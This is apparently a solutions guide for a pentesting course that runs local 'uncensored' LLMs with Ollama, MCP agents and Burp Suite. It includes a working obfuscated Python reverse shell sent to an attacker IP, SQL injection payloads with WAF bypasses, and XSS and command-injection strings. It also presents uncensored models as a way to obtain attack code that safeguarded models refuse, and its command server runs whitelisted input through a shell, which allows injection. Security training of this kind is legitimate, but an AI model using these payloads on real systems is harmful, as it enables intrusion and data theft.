# Exercise Solutions & Configuration Examples
## Complete Setup Guides and Reference Implementations

**Note:** These are reference solutions. Your implementation may vary based on your environment and requirements.

---

## 📋 Table of Contents

- [Lab 0: Setup Verification Solutions](#lab-0-setup-verification-solutions)
- [Lab 1: Uncensored Models Solutions](#lab-1-uncensored-models-solutions)
- [Lab 2: MCP Agent Setup Solutions](#lab-2-mcp-agent-setup-solutions)
- [Lab 3: Burp Suite Integration Solutions](#lab-3-burp-suite-integration-solutions)
- [Advanced Configurations](#advanced-configurations)
- [Troubleshooting Guide](#troubleshooting-guide)

---

## Lab 0: Setup Verification Solutions

### Complete Ollama Installation

**Windows:**
```powershell
# Download from ollama.com and run installer
# Or use package manager:
winget install Ollama.Ollama

# Verify installation
ollama --version

# Start Ollama service (should start automatically)
# Check status:
Get-Service Ollama
```

**macOS:**
```bash
# Using Homebrew
brew install ollama

# Or download from ollama.com

# Verify
ollama --version

# Ollama runs as a background service automatically
```

**Linux:**
```bash
# Install script
curl -fsSL https://ollama.com/install.sh | sh

# Verify
ollama --version

# Start service
systemctl start ollama
systemctl enable ollama
```

---

### Model Download Commands

**Essential Security Models:**

```bash
# 1. General uncensored model (26GB)
ollama pull dolphin-mixtral

# 2. Security reasoning (37GB)
ollama pull deepseek-r1

# 3. Balanced general purpose (48GB for 70B, 5GB for 8B)
ollama pull llama3.1:70b
# OR for lower VRAM:
ollama pull llama3.1:8b

# 4. Pentesting-specific model (16GB)
ollama pull xploiter/pentester

# 5. Uncensored coding (12GB)
ollama pull wizard-vicuna-uncensored
```

**Check Downloaded Models:**
```bash
ollama list
```

**Expected Output:**
```
NAME                    ID           SIZE    MODIFIED
dolphin-mixtral:latest  abc123       26 GB   2 days ago
deepseek-r1:latest      def456       37 GB   2 days ago
llama3.1:70b           ghi789       48 GB   2 days ago
```

---

### Testing Basic Inference

**Simple Test:**
```bash
ollama run dolphin-mixtral "Explain what OPSEC means in cybersecurity"
```

**Expected Behavior:**
- Model loads (may take 10-30 seconds first time)
- Generates response about operational security
- Returns to prompt

**Performance Check:**
```bash
# Time a response
time ollama run dolphin-mixtral "Write a Python function to parse JSON"
```

**Good Performance:**
- 8B model: 30-100 tokens/second
- 34B model: 10-30 tokens/second
- 70B model: 5-15 tokens/second

(Varies by hardware)

---

## Lab 1: Uncensored Models Solutions

### Exercise 1B: Local Model Response Example

**Prompt:**
```
Write a Python script that generates a reverse shell payload for a penetration test.
Include obfuscation techniques to bypass basic AV. This is for an authorized
security assessment with written permission.
```

**Expected Output from dolphin-mixtral:**

```python
#!/usr/bin/env python3
"""
Reverse Shell Generator for Authorized Penetration Testing
WARNING: Use only with written authorization
"""
import socket
import subprocess
import base64
import os

def generate_reverse_shell(lhost, lport):
    """
    Generate obfuscated reverse shell payload

    Args:
        lhost: Attacker's IP address
        lport: Listening port
    """
    # Basic reverse shell command
    shell_cmd = f"""
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('{lhost}',{lport}));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(['/bin/sh','-i'])
    """

    # Obfuscation technique 1: Base64 encoding
    encoded = base64.b64encode(shell_cmd.encode()).decode()

    # Obfuscation technique 2: String splitting
    payload = f"""python3 -c "import base64;exec(base64.b64decode('{encoded}'))" """

    return payload

# Example usage for authorized testing
if __name__ == "__main__":
    LHOST = "10.0.0.1"  # Replace with your listener IP
    LPORT = 4444

    payload = generate_reverse_shell(LHOST, LPORT)
    print(f"[+] Reverse shell payload generated:")
    print(payload)

    # For further obfuscation, you can:
    # 1. Use encrypted payloads
    # 2. Polymorphic code generation
    # 3. Sandbox detection avoidance
    # 4. String obfuscation libraries
```

**Cloud Model Response (Comparison):**
Likely would refuse or provide heavily sanitized example without actual working code.

---

### Exercise 1C: SQL Injection Payloads

**Prompt:**
```
I'm conducting an authorized web application security assessment. Generate 10 advanced
SQL injection payloads that test for time-based blind SQL injection vulnerabilities.
Include explanations for each.
```

**Expected Output:**

```
SQL INJECTION TEST PAYLOADS (Authorized Testing Only)
Target: Time-based Blind SQL Injection

1. Basic Time Delay (MySQL)
   Payload: ' OR SLEEP(5)-- -
   Explanation: If response takes 5+ seconds, vulnerable
   Detection: Easiest to detect, useful for initial confirmation

2. Conditional Time Delay (MySQL)
   Payload: ' OR IF(1=1,SLEEP(5),0)-- -
   Explanation: Tests boolean logic + time delay
   Use: Confirm you can execute conditional statements

3. Substring Enumeration (MySQL)
   Payload: ' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
   Explanation: Enumerate database name character by character
   Use: Data exfiltration via timing side-channel

4. PostgreSQL Time Delay
   Payload: '; SELECT pg_sleep(5)--
   Explanation: PostgreSQL-specific sleep function
   Detection: Database fingerprinting + confirmation

5. MSSQL Time Delay
   Payload: '; WAITFOR DELAY '00:00:05'--
   Explanation: Microsoft SQL Server sleep equivalent
   Use: MSSQL-specific testing

6. Oracle Time Delay
   Payload: ' OR DBMS_LOCK.SLEEP(5)--
   Explanation: Oracle database time delay
   Requires: DBMS_LOCK package access (not always available)

7. SQLite Time Delay
   Payload: ' OR RANDOMBLOB(100000000)--
   Explanation: SQLite doesn't have SLEEP, use CPU-intensive operation
   Detection: Response time increases based on blob size

8. Stacked Query Time Delay (if supported)
   Payload: '; SELECT SLEEP(5)--
   Explanation: Semicolon allows multiple statements
   Use: Test if backend allows stacked queries

9. WAF Bypass - Inline Comment
   Payload: '/**/OR/**/SLEEP(5)--
   Explanation: Inline comments may bypass simple WAF rules
   Detection: Lower likelihood of WAF blocking

10. WAF Bypass - Encoded
    Payload: ' %4f%52 SLEEP(5)-- -
    Explanation: URL-encoded 'OR' keyword
    Use: Evade keyword-based WAF filters

TESTING METHODOLOGY:
1. Send request with payload
2. Measure response time (baseline vs test)
3. If delay matches payload (5+ seconds), vulnerable
4. Confirm with multiple requests (avoid network variance)
5. Use binary search for efficient data extraction

IMPORTANT: Only use on systems you have written authorization to test.
```

---

### Exercise 1D: Malware Analysis Example

**Input Code:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Expected Analysis from deepseek-r1:**

```
MALWARE ANALYSIS REPORT

=== BEHAVIORAL DESCRIPTION ===
This is a Python-based reverse shell that establishes a connection back to an
attacker-controlled command and control (C2) server. Upon execution, the malware:

1. Creates a TCP socket (IPv4, stream-based)
2. Connects to remote IP 10.0.0.1 on port 4444
3. Redirects stdin (0), stdout (1), and stderr (2) to the socket
4. Spawns an interactive shell (/bin/sh -i)
5. Provides attacker with full shell access to compromised system

=== MITRE ATT&CK MAPPING ===
- T1059.006: Command and Scripting Interpreter: Python
  * Uses Python for execution and evasion

- T1071.001: Application Layer Protocol: Web Protocols
  * Uses standard TCP socket (could be HTTP/HTTPS wrapped)

- T1573: Encrypted Channel
  * Note: This sample uses PLAINTEXT (no encryption)
  * Variant risk: Could be wrapped in TLS

- T1105: Ingress Tool Transfer
  * Once shell established, likely used for additional tool download

- T1041: Exfiltration Over C2 Channel
  * Bidirectional channel allows data exfiltration

=== INDICATORS OF COMPROMISE (IOCs) ===

Network Indicators:
- IP Address: 10.0.0.1 (C2 server)
- Port: 4444/TCP
- Protocol: TCP (plaintext communication)

File Indicators:
- File hash (if written to disk): [calculate from actual file]
- Typical filenames: update.py, config.py, .hidden.py
- File path patterns: /tmp/, /var/tmp/, ~/.config/

Process Indicators:
- Process name: python, python3
- Command line contains: socket, subprocess, dup2
- Parent/child relationship: python → /bin/sh
- Network connections: ESTABLISHED to 10.0.0.1:4444

Behavioral Indicators:
- Python process making outbound connections
- Shell spawned as child of Python
- Interactive shell without controlling terminal
- Persistent socket connection

=== YARA RULE ===

rule Python_ReverseShell_Generic {
    meta:
        description = "Detects Python-based reverse shell malware"
        author = "Security Analyst"
        date = "2026-05-26"
        severity = "high"
        mitre_attack = "T1059.006"

    strings:
        $s1 = "socket.socket" ascii
        $s2 = "subprocess" ascii
        $s3 = "os.dup2" ascii
        $s4 = ".connect((" ascii
        $s5 = "/bin/sh" ascii
        $s6 = "s.fileno()" ascii

        // Alternative patterns
        $s7 = "socket.AF_INET" ascii
        $s8 = "socket.SOCK_STREAM" ascii

    condition:
        // Must be Python file or script
        (uint16(0) == 0x2123 or // Shebang "#!"
         extension == ".py") and

        // Must have socket + subprocess + redirection
        ($s1 and $s2 and $s3 and $s4) and

        // Shell execution indicator
        $s5 and

        // At least 4 of the secondary indicators
        3 of ($s6, $s7, $s8)
}

=== REMEDIATION RECOMMENDATIONS ===

Immediate Actions:
1. Isolate affected system from network
2. Kill process (pkill -f socket.socket)
3. Block egress traffic to 10.0.0.1:4444
4. Collect forensic evidence:
   - Process memory dump
   - Network connection logs
   - Disk image
5. Search for persistence mechanisms
   - Cron jobs: crontab -l
   - systemd services
   - rc.local, bashrc modifications

Investigation:
1. Determine initial compromise vector
   - Check web server logs
   - Review email attachments
   - Analyze recent downloads
2. Timeline analysis - when was this executed?
3. Assess data exfiltration - what was accessed?
4. Identify other compromised systems (lateral movement)

Long-term Mitigations:
1. Deploy EDR with Python behavioral monitoring
2. Network egress filtering (deny outbound except allowed)
3. Application whitelisting
4. Monitor for suspicious Python executions
5. Harden SSH/RDP access (initial access prevention)

=== SOPHISTICATION ASSESSMENT ===
Low-to-Medium sophistication:
- Basic reverse shell (no obfuscation in this sample)
- Plaintext communication (easily detected)
- Hard-coded C2 (no DGA or fallback domains)

However:
- Effective on unprotected systems
- Easy to modify (add encryption, obfuscation)
- Part of standard attacker toolkit

=== ATTRIBUTION CLUES ===
Generic technique used by:
- Commodity malware
- Script kiddies
- APT groups (as initial access tool)

No definitive attribution possible from this sample alone.
Requires correlation with:
- C2 infrastructure (WHOIS, historical analysis)
- Other TTPs observed in campaign
- Code similarities to known groups
```

**Why This Is Valuable:**
- Cannot upload to cloud services (legal/contractual restrictions on malware)
- Local analysis keeps sensitive data protected
- Uncensored model provides full technical details
- YARA rule generated is immediately actionable

---

## Lab 2: MCP Agent Setup Solutions

### Complete MCP Configuration

**Directory Structure:**
```
~/.config/mcp/
├── config.json           # Main MCP configuration
├── servers/
│   ├── command_mcp.py   # Custom command execution server
│   └── threat_intel.py  # Custom threat intel MCP (optional)
```

---

### Full MCP Configuration File

**Location:** `~/.config/mcp/config.json` (Mac/Linux) or `%APPDATA%\mcp\config.json` (Windows)

```json
{
  "mcpServers": {
    "duckduckgo": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-duckduckgo"],
      "description": "Web search for OSINT and threat intelligence"
    },
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/home/user/pentest-workspace"
      ],
      "description": "File operations for evidence collection and reporting"
    },
    "sysexec": {
      "command": "python3",
      "args": ["/home/user/.config/mcp/servers/command_mcp.py"],
      "description": "CAUTION: Execute system commands for recon tools",
      "env": {
        "ALLOWED_COMMANDS": "nmap,dig,whois,openssl,curl,wget"
      }
    },
    "wazuh": {
      "command": "npx",
      "args": [
        "-y",
        "@wazuh/mcp-server",
        "--api-url", "http://localhost:55000",
        "--username", "wazuh",
        "--password", "wazuh"
      ],
      "description": "Wazuh SIEM integration for blue team operations"
    }
  },
  "globalSettings": {
    "logging": true,
    "logPath": "/var/log/mcp/",
    "maxConcurrentServers": 5,
    "timeout": 30000
  }
}
```

---

### Custom Command Execution MCP Server

**File:** `~/.config/mcp/servers/command_mcp.py`

```python
#!/usr/bin/env python3
"""
Custom MCP server for executing system commands
SECURITY: Only allows whitelisted commands
For authorized security testing only
"""
import subprocess
import json
import sys
import os
import shlex

# Whitelist of allowed commands (modify based on your needs)
ALLOWED_COMMANDS = os.getenv('ALLOWED_COMMANDS', 'nmap,dig,whois,host').split(',')

# Maximum execution time (seconds)
TIMEOUT = 30

def is_command_allowed(command):
    """Check if command is in whitelist"""
    cmd_base = shlex.split(command)[0] if command else ""
    return cmd_base in ALLOWED_COMMANDS

def execute_command(command):
    """
    Execute a whitelisted system command
    Returns stdout, stderr, and return code
    """
    if not is_command_allowed(command):
        return {
            "error": f"Command not allowed. Whitelist: {', '.join(ALLOWED_COMMANDS)}",
            "stdout": "",
            "stderr": "",
            "returncode": -1
        }

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=TIMEOUT
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
            "success": result.returncode == 0
        }
    except subprocess.TimeoutExpired:
        return {
            "error": f"Command timed out after {TIMEOUT} seconds",
            "stdout": "",
            "stderr": "",
            "returncode": -1
        }
    except Exception as e:
        return {
            "error": str(e),
            "stdout": "",
            "stderr": "",
            "returncode": -1
        }

def handle_mcp_request(request):
    """Handle MCP protocol requests"""
    method = request.get("method", "")

    if method == "tools/list":
        # Return available tools
        return {
            "tools": [
                {
                    "name": "execute_command",
                    "description": f"Execute whitelisted system commands: {', '.join(ALLOWED_COMMANDS)}",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "command": {
                                "type": "string",
                                "description": "System command to execute"
                            }
                        },
                        "required": ["command"]
                    }
                }
            ]
        }

    elif method == "tools/call":
        tool_name = request["params"]["name"]
        if tool_name == "execute_command":
            command = request["params"]["arguments"]["command"]
            result = execute_command(command)
            return {
                "content": [
                    {
                        "type": "text",
                        "text": json.dumps(result, indent=2)
                    }
                ]
            }

    return {"error": "Unknown method"}

# Main MCP server loop
if __name__ == "__main__":
    print(f"[INFO] Command MCP server started", file=sys.stderr)
    print(f"[INFO] Allowed commands: {', '.join(ALLOWED_COMMANDS)}", file=sys.stderr)

    for line in sys.stdin:
        try:
            request = json.loads(line)
            response = handle_mcp_request(request)
            print(json.dumps(response))
            sys.stdout.flush()
        except json.JSONDecodeError as e:
            print(json.dumps({"error": f"Invalid JSON: {e}"}))
            sys.stdout.flush()
        except Exception as e:
            print(json.dumps({"error": str(e)}))
            sys.stdout.flush()
```

**Make executable:**
```bash
chmod +x ~/.config/mcp/servers/command_mcp.py
```

---

### Testing MCP Setup

**Test Individual MCP Server:**

```bash
# Test DuckDuckGo search
echo '{"method":"tools/list"}' | npx @modelcontextprotocol/server-duckduckgo

# Test command execution
echo '{"method":"tools/list"}' | python3 ~/.config/mcp/servers/command_mcp.py
```

**Expected Output:**
Should return JSON with available tools and their schemas.

---

### Complete Agent Example

**Autonomous Subdomain Enumeration Agent:**

Create file: `subdomain_enum_agent.py`

```python
#!/usr/bin/env python3
"""
Autonomous subdomain enumeration agent using local LLM + MCP
Authorized security testing only
"""
import json
import subprocess
import sys

TARGET_DOMAIN = "example.com"  # Replace with authorized target
MCP_CONFIG = "/home/user/.config/mcp/config.json"

AGENT_PROMPT = f"""
AUTHORIZED SECURITY ASSESSMENT
Target: {TARGET_DOMAIN}
Authorization: [SOW REFERENCE]

TASK: Autonomous subdomain enumeration and risk assessment

WORKFLOW:
1. Use DuckDuckGo MCP to search "site:crt.sh {TARGET_DOMAIN}"
2. Extract all unique subdomains from search results
3. For each subdomain found:
   a. Use sysexec MCP to run: dig [subdomain] +short
   b. Extract IP addresses
4. Use filesystem MCP to save results to {TARGET_DOMAIN}-subdomains.txt
5. Use DuckDuckGo MCP to lookup threat intel on discovered IPs
6. Generate summary report with risk ratings

OUTPUT REQUIREMENTS:
- Subdomain count
- IP address ranges identified
- High-risk findings (known malicious IPs, unusual ports)
- Recommendations for next testing phase

Execute autonomously. Save all outputs for evidence.
Only ask for clarification if a tool fails.
"""

def run_agent():
    """Execute the agent using local Ollama model"""
    print("[+] Starting subdomain enumeration agent...")
    print(f"[+] Target: {TARGET_DOMAIN}")
    print(f"[+] MCP Config: {MCP_CONFIG}")

    # In a full implementation, this would:
    # 1. Connect to Ollama API
    # 2. Send AGENT_PROMPT
    # 3. Stream responses
    # 4. Monitor MCP tool calls
    # 5. Handle errors and retries

    # Simplified example: Direct Ollama API call
    cmd = [
        "curl",
        "-X", "POST",
        "http://localhost:11434/api/generate",
        "-H", "Content-Type: application/json",
        "-d", json.dumps({
            "model": "dolphin-mixtral",
            "prompt": AGENT_PROMPT,
            "stream": False
        })
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        response = json.loads(result.stdout)
        print("\n[+] Agent Response:")
        print(response.get("response", "No response"))
    else:
        print(f"[-] Error: {result.stderr}")
        sys.exit(1)

if __name__ == "__main__":
    run_agent()
```

**Run the agent:**
```bash
python3 subdomain_enum_agent.py
```

---

## Lab 3: Burp Suite Integration Solutions

### BurpGPT Configuration for Local Ollama

**Step 1: Install BurpGPT Extension**

1. Download latest JAR: [github.com/aress31/burpgpt/releases](https://github.com/aress31/burpgpt/releases)
2. Burp Suite → Extensions → Add
3. Select `burpgpt.jar`

**Step 2: Configure for Ollama**

In BurpGPT Settings tab:

```
API Endpoint: http://localhost:11434/api/generate
API Key: (leave empty for local Ollama)
Model: dolphin-mixtral
Temperature: 0.7
Max Tokens: 2048
Stream: false
```

**Step 3: Custom Prompt Template**

Replace default BurpGPT prompt with security-focused template:

```
Analyze this HTTP request for potential security vulnerabilities:

REQUEST:
{REQUEST}

RESPONSE:
{RESPONSE}

ANALYSIS REQUIRED:
1. Identify ALL injection points (parameters, headers, cookies, path, body)
2. For each injection point, suggest specific attack payloads:
   - SQL injection (time-based, boolean, union)
   - XSS (reflected, stored, DOM)
   - Command injection
   - Path traversal
   - XXE
   - SSRF
3. Flag security misconfigurations:
   - Missing security headers
   - Weak authentication
   - Information disclosure in responses
4. Prioritize findings by exploitability (CRITICAL/HIGH/MEDIUM/LOW)

OUTPUT FORMAT:
- Finding list (severity, location, payload)
- Recommended testing sequence
- Evidence to collect if exploited

This is authorized penetration testing per SOW. Be thorough and technical.
```

---

### Testing Burp + Local LLM

**Test Request:**

1. Navigate to a test web app (your own or authorized)
2. Capture a POST request in Burp Proxy
3. Right-click → Send to BurpGPT
4. Review analysis

**Example Analysis Output:**

```
VULNERABILITY ANALYSIS
[Generated by dolphin-mixtral via BurpGPT]

REQUEST SUMMARY:
POST /login
Parameters: username, password, remember_me

=== INJECTION POINTS IDENTIFIED ===

1. Parameter: username
   Location: POST body
   Type: String input

   RECOMMENDED PAYLOADS:

   SQLi (Time-based):
   - admin' OR SLEEP(5)-- -
   - admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

   SQLi (Boolean):
   - admin' OR '1'='1
   - admin' OR 1=1-- -

   XSS:
   - <script>alert(1)</script>
   - <img src=x onerror=alert(1)>

   Command Injection:
   - admin; whoami
   - admin`whoami`

   PRIORITY: HIGH
   REASON: Login forms often vulnerable to SQLi

2. Parameter: password
   [Similar analysis...]

3. Cookie: PHPSESSID
   Location: Cookie header
   Type: Session identifier

   RECOMMENDED TESTS:
   - Session fixation
   - Weak randomness analysis
   - Cookie tampering

   PRIORITY: MEDIUM

=== SECURITY MISCONFIGURATIONS ===

1. Missing Header: X-Frame-Options
   RISK: Clickjacking attacks possible
   FIX: Add "X-Frame-Options: DENY"
   SEVERITY: MEDIUM

2. Missing Header: Content-Security-Policy
   RISK: XSS exploitation easier
   FIX: Implement restrictive CSP
   SEVERITY: HIGH

3. Information Disclosure: Server header reveals version
   OBSERVED: Server: Apache/2.4.41 (Ubuntu)
   RISK: Targeted exploits for known vulnerabilities
   FIX: Remove or obfuscate server header
   SEVERITY: LOW

=== TESTING SEQUENCE ===

1. TEST: SQL Injection on username parameter
   PAYLOAD: admin' OR SLEEP(5)-- -
   SUCCESS INDICATOR: Response time >5 seconds
   IF SUCCESS: Proceed to data extraction

2. TEST: XSS on username (if SQLi fails)
   PAYLOAD: <script>alert(document.cookie)</script>
   SUCCESS INDICATOR: Alert popup or reflected in response
   IF SUCCESS: Test for stored XSS, session hijacking

3. TEST: Session management
   PAYLOAD: [Manual cookie manipulation]
   SUCCESS INDICATOR: Able to hijack or predict session IDs
   IF SUCCESS: Account takeover POC

=== EVIDENCE COLLECTION ===

If any test succeeds:
- Screenshot of successful exploitation
- Full HTTP request/response (base64 encode if needed)
- Timestamp and tester identity
- Steps to reproduce
- Remediation verification steps
```

---

## Advanced Configurations

### Production Ollama Deployment

**Systemd Service Configuration (Linux):**

File: `/etc/systemd/system/ollama.service`

```ini
[Unit]
Description=Ollama Local LLM Server
After=network.target

[Service]
Type=simple
User=ollama
Group=ollama
Environment="OLLAMA_HOST=127.0.0.1:11434"
Environment="OLLAMA_MODELS=/var/lib/ollama/models"
ExecStart=/usr/local/bin/ollama serve
Restart=always
RestartSec=10

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/ollama

[Install]
WantedBy=multi-user.target
```

**Enable and start:**
```bash
sudo systemctl enable ollama
sudo systemctl start ollama
sudo systemctl status ollama
```

---

### Nginx Reverse Proxy with Auth (Optional Network Access)

**File:** `/etc/nginx/sites-available/ollama`

```nginx
upstream ollama_backend {
    server 127.0.0.1:11434;
}

server {
    listen 443 ssl http2;
    server_name ollama.yourdomain.com;

    # SSL configuration
    ssl_certificate /etc/letsencrypt/live/ollama.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ollama.yourdomain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Authentication
    auth_basic "Ollama Access - Authorized Personnel Only";
    auth_basic_user_file /etc/nginx/.htpasswd;

    # Logging
    access_log /var/log/nginx/ollama_access.log;
    error_log /var/log/nginx/ollama_error.log;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=ollama_limit:10m rate=10r/s;
    limit_req zone=ollama_limit burst=20 nodelay;

    location / {
        proxy_pass http://ollama_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeout settings for long inference
        proxy_read_timeout 300s;
        proxy_connect_timeout 75s;
    }
}
```

**Create auth file:**
```bash
sudo htpasswd -c /etc/nginx/.htpasswd pentester
# Enter password when prompted
```

**Enable:**
```bash
sudo ln -s /etc/nginx/sites-available/ollama /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

---

## Troubleshooting Guide

### Problem: Ollama models load slowly

**Symptoms:**
- First inference takes 30+ seconds
- Subsequent requests are fast

**Solution:**
This is normal for large models. First load moves model from disk to VRAM.

**Optimization:**
```bash
# Keep model loaded in memory
ollama run dolphin-mixtral
# Then don't exit - keep the session alive
# Or use API to load and keep warm
curl http://localhost:11434/api/generate -d '{"model": "dolphin-mixtral", "keep_alive": -1}'
```

---

### Problem: Out of Memory (OOM) errors

**Symptoms:**
```
Error: model requires more memory than available
```

**Solution:**
1. Use smaller model or more aggressive quantization:
```bash
# Instead of 70b, try 34b
ollama pull dolphin-mixtral  # 34B equivalent

# Or use Q4 instead of Q8
ollama pull llama3.1:70b-q4_K_M
```

2. Close other applications
3. Increase system swap (not recommended for production)

---

### Problem: MCP server won't start

**Symptoms:**
```
Error: Cannot find module '@modelcontextprotocol/server-duckduckgo'
```

**Solution:**
```bash
# Install globally
npm install -g @modelcontextprotocol/server-duckduckgo

# Verify installation
npx @modelcontextprotocol/server-duckduckgo --help
```

**Verify Node.js version:**
```bash
node --version  # Should be 18+
```

---

### Problem: Burp Suite can't connect to Ollama

**Symptoms:**
BurpGPT shows "Connection refused" or timeout errors

**Solution:**
1. Verify Ollama is running:
```bash
curl http://localhost:11434/api/tags
```

2. Check firewall isn't blocking localhost

3. Test with curl:
```bash
curl -X POST http://localhost:11434/api/generate \
  -H "Content-Type: application/json" \
  -d '{"model": "dolphin-mixtral", "prompt": "Test"}'
```

4. If using Docker, ensure port mapping:
```bash
docker run -d -p 11434:11434 ollama/ollama
```

---

### Problem: Model responses are nonsensical

**Symptoms:**
- Garbled output
- Repeated tokens
- Incoherent responses

**Possible Causes:**
1. **Corrupted model download**
   ```bash
   # Re-download
   ollama rm dolphin-mixtral
   ollama pull dolphin-mixtral
   ```

2. **Incorrect quantization for hardware**
   - Try different quant (Q4 vs Q8)

3. **Temperature too high**
   - Lower temperature in API call (0.5-0.7 for technical tasks)

---

## Next Steps

1. **Review all configurations** - Ensure everything matches your environment
2. **Test each component** - Verify Ollama, MCPs, integrations work
3. **Build your workflow** - Start with simple tasks, increase complexity
4. **Document what works** - Keep notes on successful configurations
5. **Share with community** - Contribute improvements back

---

**Solutions Version:** 1.0
**Tested Environment:** Ubuntu 22.04, macOS Sonoma, Windows 11
**Last Verified:** May 2026
